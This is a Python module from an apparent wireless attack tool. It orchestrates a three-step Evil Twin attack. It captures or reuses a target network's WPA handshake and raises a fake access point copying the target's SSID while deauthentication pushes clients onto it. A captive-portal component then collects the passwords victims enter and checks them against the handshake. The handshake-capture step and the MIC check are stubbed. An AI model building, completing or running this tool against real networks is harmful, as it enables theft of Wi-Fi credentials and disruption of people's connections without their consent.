"""EvilTwin orchestration: Steps 1-3 with handshake detection."""

import asyncio
import time
import logging
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, Optional

from airscope.evil_twin.usb.worker import ApWorker


log = logging.getLogger(__name__)


@dataclass
class CaptivePortalOrchestrator:
    """High-level controller for the captive-portal EvilTwin.

    Called from ``EvilTwinCampaign._step3_captive_portal`` after Step 1
    captures a real handshake and Step 2 brings up the OPEN twin beacon.
    """
    driver: object
    iface: object
    ssid: str
    bssid: str
    channel: int
    hs: object
    pair: object
    log_fn: Optional[Callable[[str], None]] = None
    on_password: Optional[Callable[[str], None]] = None

    _worker: Optional[ApWorker] = field(default=None, repr=False)
    _log: Optional[Callable] = field(default=None, repr=False)

    def __post_init__(self) -> None:
        self._log = self.log_fn or (lambda m: log.info(m))

    async def start(self) -> None:
        self._worker = ApWorker(
            driver=self.driver,
            iface=self.iface,
            ssid=self.ssid,
            bssid=self.bssid,
            channel=self.channel,
            hs=self.hs,
            pair=self.pair,
            on_password=self.on_password,
            log_fn=self._log,
        )
        await self._worker.start()
        self._log("[captive-portal] AP stack running")

    async def stop(self) -> None:
        if self._worker:
            await self._worker.stop()
            self._worker = None
            self._log("[captive-portal] AP stack stopped")


class EvilTwinAttack:
    """Orchestrates the 3-step EvilTwin attack."""

    def __init__(self, usb_worker_factory, tui_app, captures_dir: Path):
        self._create_worker = usb_worker_factory
        self._app = tui_app
        self._captures_dir = captures_dir
        self._captures_dir.mkdir(parents=True, exist_ok=True)

        self.handshake_file: Optional[Path] = None
        self._running = False
        self._step = 0
        self._rtl_ap = None

    async def start(self, target_bssid: str, target_ssid: str,
                    channel: int, adapter, ep_rx: int, ep_tx: int,
                    ap_mac: bytes, deauth_interval: float = 0.1):
        existing = self._find_existing_handshake(target_bssid)

        if existing:
            choice = await self._show_handshake_prompt(existing)

            if choice == 0:
                self.handshake_file = existing
                log.info(f"[ET] Using existing handshake: {existing}")
                self._post_tui(f"⚡ Using existing handshake: {existing.name}")
                await self._run_step_2(target_bssid, target_ssid, channel,
                                       adapter, ep_rx, ep_tx, ap_mac,
                                       deauth_interval)
                await self._run_step_3()
                return

            elif choice == 1:
                custom = await self._show_path_input(str(existing))
                if custom and self._validate_handshake(Path(custom), target_bssid):
                    self.handshake_file = Path(custom)
                    self._post_tui(f"⚡ Using custom handshake: {custom}")
                    await self._run_step_2(target_bssid, target_ssid, channel,
                                           adapter, ep_rx, ep_tx, ap_mac,
                                           deauth_interval)
                    await self._run_step_3()
                    return
                else:
                    self._post_tui("⚠️ Invalid path, starting fresh capture")

        self._step = 1
        self._post_tui("📡 Step 1: Capturing WPA handshake...")
        self.handshake_file = await self._run_step_1(target_bssid, target_ssid,
                                                     channel, adapter, ep_rx, ep_tx)

        if self.handshake_file is None:
            self._post_tui("❌ Handshake capture failed")
            return

        self._post_tui(f"✅ Handshake captured: {self.handshake_file.name}")

        await self._run_step_2(target_bssid, target_ssid, channel,
                               adapter, ep_rx, ep_tx, ap_mac, deauth_interval)

        await self._run_step_3()

    def _find_existing_handshake(self, target_bssid: str) -> Optional[Path]:
        bssid_clean = target_bssid.replace(":", "").lower()

        for f in self._captures_dir.iterdir():
            if f.suffix not in ('.pcap', '.pcapng', '.hc22000', '.hccapx'):
                continue
            stem_clean = f.stem.replace("-", "").replace(":", "").lower()
            if bssid_clean in stem_clean:
                return f

        return None

    async def _show_handshake_prompt(self, existing: Path) -> int:
        from ..screens.handshake_prompt import HandshakePromptScreen

        result = await self._app.push_screen_wait(
            HandshakePromptScreen(existing)
        )
        return result

    async def _show_path_input(self, default: str) -> Optional[str]:
        from ..screens.path_input import PathInputScreen
        result = await self._app.push_screen_wait(PathInputScreen(default))
        return result

    def _validate_handshake(self, path: Path, bssid: str) -> bool:
        if not path.exists():
            return False
        if path.suffix not in ('.pcap', '.pcapng', '.hc22000', '.hccapx'):
            return False
        if path.stat().st_size < 100:
            return False
        return True

    def _post_tui(self, message: str):
        self._app.call_from_thread(
            lambda: self._app.post_message(message)
        )

    async def _run_step_1(self, bssid, ssid, channel, adapter, ep_rx, ep_tx):
        pass

    async def _run_step_2(self, bssid, ssid, channel, adapter, ep_rx, ep_tx,
                          ap_mac, deauth_interval):
        from .ap.ap_core import APStateMachine
        from .ap.frames import craft_beacon
        from .usb.rtl8812au_ap import Rtl8812auAP

        beacon = craft_beacon(ap_mac, ssid, channel, seq=0)

        deauth_frames = []

        # Initialize monitor mode RX (RCR = accept all frames)
        rtl_ap = Rtl8812auAP(dev=adapter, ep_rx=ep_rx, ep_tx=ep_tx)
        rtl_ap.init_monitor_rx()
        self._rtl_ap = rtl_ap

        ap_sm = APStateMachine(ap_mac, ssid, channel,
                               usb_tx=self._create_worker_enqueue)

        worker = self._create_worker(
            usb_dev=adapter,
            ep_rx=ep_rx,
            ep_tx=ep_tx,
            ap_state_machine=ap_sm,
            beacon_frame=beacon,
            deauth_frames=deauth_frames,
            deauth_interval=deauth_interval,
            rtl_ap=rtl_ap,
        )
        worker.start()

        self._post_tui("📶 Step 2: Fake AP active, deauth running...")

        await self._wait_for_clients(worker, timeout=300)

        worker.stop()
        rtl_ap.deinit_ap_mode()

    async def _run_step_3(self):
        self._post_tui("🔐 Step 3: Verifying MIC...")

    async def _wait_for_clients(self, worker, timeout: float = 300):
        start = time.monotonic()
        while time.monotonic() - start < timeout:
            await asyncio.sleep(1)
            if worker.stats.get('rx', 0) > 0:
                break
        self._post_tui(f"📊 Session stats: TX={worker.stats['tx']}, RX={worker.stats['rx']}")
